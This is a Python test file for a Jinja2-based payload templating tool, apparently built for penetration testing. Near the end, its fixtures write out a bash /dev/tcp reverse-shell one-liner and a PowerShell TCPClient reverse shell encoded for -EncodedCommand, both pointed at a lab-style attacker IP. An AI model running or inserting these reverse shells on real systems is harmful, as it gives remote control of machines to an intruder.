"""Tests for the Jinja2 template rendering engine."""

import os
from pathlib import Path

import pytest

from profi.context import compute_dynamic_values
from profi.filters import base64_encode, base64_pwsh, hex_encode, url_encode
from profi.loader import YamlContentLoader
from profi.renderer import create_environment, render_template, render_template_string


class TestFilters:
    """Test custom Jinja2 filters."""

    def test_url_encode(self):
        """Test URL encoding filter."""
        assert url_encode("hello world") == "hello%20world"
        assert url_encode("test@example.com") == "test%40example.com"
        assert url_encode("a/b/c") == "a%2Fb%2Fc"

    def test_base64_encode(self):
        """Test standard base64 encoding."""
        assert base64_encode("hello") == "aGVsbG8="
        assert base64_encode("test123") == "dGVzdDEyMw=="

    def test_base64_pwsh(self):
        """Test PowerShell base64 encoding (UTF-16 LE)."""
        # PowerShell expects UTF-16 LE encoding
        result = base64_pwsh("Write-Host 'Hello'")
        # Verify it's a valid base64 string
        assert len(result) > 0
        assert all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in result)

    def test_hex_encode(self):
        """Test hexadecimal encoding."""
        assert hex_encode("hello") == "68656c6c6f"
        assert hex_encode("ABC") == "414243"


class TestYamlContentLoader:
    """Test the custom YAML content loader."""

    def test_loader_extracts_content(self, tmp_path):
        """Test that loader extracts only the content field."""
        # Create a temporary template file
        template_file = tmp_path / "test.yaml"
        template_file.write_text("""
metadata:
  filename: "test.yaml"
  tags: ["test"]
content: |
  Hello {{ name }}
""")

        loader = YamlContentLoader(tmp_path)
        env = create_environment(tmp_path)

        source, filename, uptodate = loader.get_source(env, "test.yaml")

        # Should extract only content, not metadata
        assert "Hello {{ name }}" in source
        assert "metadata" not in source
        assert "filename" not in source

    def test_loader_auto_adds_yaml_extension(self, tmp_path):
        """Test that loader automatically adds .yaml extension."""
        template_file = tmp_path / "test.yaml"
        template_file.write_text("""
content: |
  Test content
""")

        loader = YamlContentLoader(tmp_path)
        env = create_environment(tmp_path)

        # Request without .yaml extension
        source, _, _ = loader.get_source(env, "test")

        assert "Test content" in source


class TestContextComputation:
    """Test dynamic value computation."""

    def test_compute_dynamic_values_from_env(self):
        """Test that OP_* environment variables are loaded into context."""
        # Set test environment variables
        os.environ["OP_TEST_VAR"] = "test_value"
        os.environ["OP_SHELL_PORT"] = "4444"

        config = {}
        context = compute_dynamic_values(config)

        assert "test_var" in context
        assert context["test_var"] == "test_value"
        assert "shell_port" in context
        assert context["shell_port"] == "4444"

        # Cleanup
        del os.environ["OP_TEST_VAR"]
        del os.environ["OP_SHELL_PORT"]


class TestTemplateRendering:
    """Test end-to-end template rendering."""

    def test_render_simple_variable(self, tmp_path):
        """Test rendering a template with simple variables."""
        os.environ["OP_ATTACKER_IP"] = "10.10.14.5"
        os.environ["OP_SHELL_PORT"] = "4444"

        config = {}
        result = render_template_string(
            "Connect to {{ attacker_ip }}:{{ shell_port }}",
            tmp_path,
            config
        )

        assert result == "Connect to 10.10.14.5:4444"

        # Cleanup
        del os.environ["OP_ATTACKER_IP"]
        del os.environ["OP_SHELL_PORT"]

    def test_render_with_filter(self, tmp_path):
        """Test rendering with custom filters."""
        config = {}
        result = render_template_string(
            "{{ 'hello world' | url_encode }}",
            tmp_path,
            config
        )

        assert result == "hello%20world"

    def test_render_with_include(self, tmp_path):
        """Test rendering with template inclusion."""
        # Create a base template
        base_template = tmp_path / "base.yaml"
        base_template.write_text("""
content: |
  Base content
""")

        # Create a template that includes the base
        main_template = tmp_path / "main.yaml"
        main_template.write_text("""
content: |
  Start: {{ include('base.yaml') }} :End
""")

        config = {}
        result, _ = render_template("main.yaml", tmp_path, config, debug=False)

        assert "Start:" in result
        assert "Base content" in result
        assert ":End" in result

    def test_render_with_include_and_filter(self, tmp_path):
        """Test rendering with template inclusion and filter."""
        # Create a base template
        base_template = tmp_path / "payload.yaml"
        base_template.write_text("""
content: |
  echo hello
""")

        # Create a template that includes and encodes
        main_template = tmp_path / "encoded.yaml"
        main_template.write_text("""
content: |
  {{ include('payload.yaml') | base64 }}
""")

        config = {}
        result, _ = render_template("encoded.yaml", tmp_path, config, debug=False)

        # "echo hello" in base64
        assert result == base64_encode("echo hello")

    def test_render_removes_trailing_newline(self, tmp_path):
        """Test that trailing newlines are removed."""
        template_file = tmp_path / "test.yaml"
        template_file.write_text("""
content: |
  test content
""")

        config = {}
        result, _ = render_template("test.yaml", tmp_path, config, debug=False)

        # Should not end with newline
        assert not result.endswith('\n')
        assert result == "test content"

    def test_debug_mode_returns_info(self, tmp_path):
        """Test that debug mode returns debug information."""
        template_file = tmp_path / "test.yaml"
        template_file.write_text("""
content: |
  Test: {{ test_var | default('default') }}
""")

        os.environ["OP_TEST_VAR"] = "value"
        config = {}

        result, debug_info = render_template("test.yaml", tmp_path, config, debug=True)

        assert debug_info is not None
        assert "template_path" in debug_info
        assert "context" in debug_info
        assert "raw_template" in debug_info
        assert "rendered_output" in debug_info
        assert debug_info["template_path"] == "test.yaml"
        assert "test_var" in debug_info["context"]

        # Cleanup
        del os.environ["OP_TEST_VAR"]


class TestRealWorldScenarios:
    """Test scenarios based on actual template usage."""

    def test_powershell_base64_encoded_command(self, tmp_path):
        """Test PowerShell base64 encoded reverse shell pattern."""
        # Create base PowerShell command
        ps_oneliner = tmp_path / "payloads" / "revshell-ps.yaml"
        ps_oneliner.parent.mkdir(parents=True)
        os.environ["OP_ATTACKER_IP"] = "10.10.14.5"
        os.environ["OP_SHELL_PORT"] = "4444"

        ps_oneliner.write_text("""
content: |
  $client = New-Object System.Net.Sockets.TCPClient("{{ attacker_ip }}",{{ shell_port }})
""")

        # Create encoded version
        ps_encoded = tmp_path / "payloads" / "revshell-ps-encoded.yaml"
        ps_encoded.write_text("""
content: |
  powershell.exe -EncodedCommand {{ include('payloads/revshell-ps.yaml') | base64_pwsh }}
""")

        config = {}
        result, _ = render_template("payloads/revshell-ps-encoded.yaml", tmp_path, config, debug=False)

        assert "powershell.exe -EncodedCommand" in result
        # Result should contain base64 encoded string
        assert len(result) > 50  # Base64 encoded should be substantial

        # Cleanup
        del os.environ["OP_ATTACKER_IP"]
        del os.environ["OP_SHELL_PORT"]

    def test_url_encoded_payload(self, tmp_path):
        """Test URL encoded payload pattern."""
        # Create base payload
        payload = tmp_path / "payloads" / "revshell.yaml"
        payload.parent.mkdir(parents=True)

        payload.write_text("""
content: |
  bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
""")

        # Create URL encoded version
        encoded = tmp_path / "payloads" / "revshell-encoded.yaml"
        encoded.write_text("""
content: |
  {{ include('payloads/revshell.yaml') | url_encode }}
""")

        config = {}
        result, _ = render_template("payloads/revshell-encoded.yaml", tmp_path, config, debug=False)

        # Should be URL encoded
        assert "%2F" in result  # Forward slash encoded
        assert "%3E" in result  # > encoded
        assert " " not in result  # Spaces should be encoded
